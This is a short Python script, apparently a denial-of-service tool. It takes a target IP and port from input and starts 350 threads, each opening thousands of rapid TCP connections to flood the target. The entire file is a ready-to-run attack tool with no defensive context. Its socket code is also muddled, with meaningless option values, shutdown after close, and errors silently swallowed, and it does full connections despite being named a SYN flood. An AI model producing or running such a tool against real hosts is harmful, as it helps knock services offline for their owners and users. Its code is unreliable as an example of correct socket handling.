import socket,threading

def SYN(ip,p):
    times = 1
    for _ in range(2500):
       try:
          s = socket.socket(socket.AF_INET,socket.SOCK_STREAM, socket.IPPROTO_TCP)
          s.setblocking(0)

          s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 65536)
          s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 65536)
          s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 65536)
          s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE,65536)
          s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 65536)
          for _ in range(times):
           s.connect((ip,p)); s.connect_ex((ip ,p))
          print(s)
          s.send(b''); s.sendall(b'')
          s.close()
          s.shutdown(socket.SHUT_RDWR)
          times += 1
       except:pass

ip = input("IP ?")
port = int(input("PORT ?"))

for _ in range(350):
    threading.Thread(target=SYN,args=(ip,port)).start()
